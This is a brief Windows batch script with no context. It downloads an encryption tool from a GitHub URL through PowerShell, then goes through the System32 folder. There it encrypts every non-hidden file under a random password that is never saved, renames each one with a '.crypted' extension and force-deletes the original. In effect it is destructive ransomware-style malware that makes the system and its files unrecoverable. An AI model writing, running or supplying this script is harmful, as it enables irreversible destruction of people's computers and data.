powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/koef010/aescrypt-console/raw/refs/heads/main/aescrypt.exe','%systemdrive%\aescrypt.exe')"
set pass=%random% 
cd "%systemroot%\system32"
For /f "tokens=*" %%A in ('dir /b /s /a-d-h') do (
    C:\aescrypt -e -p %pass% "%%~A"
    ren "%%~A.aes" "%%~nA%%~xA.crypted"
    del /f /q "%%~A"
)
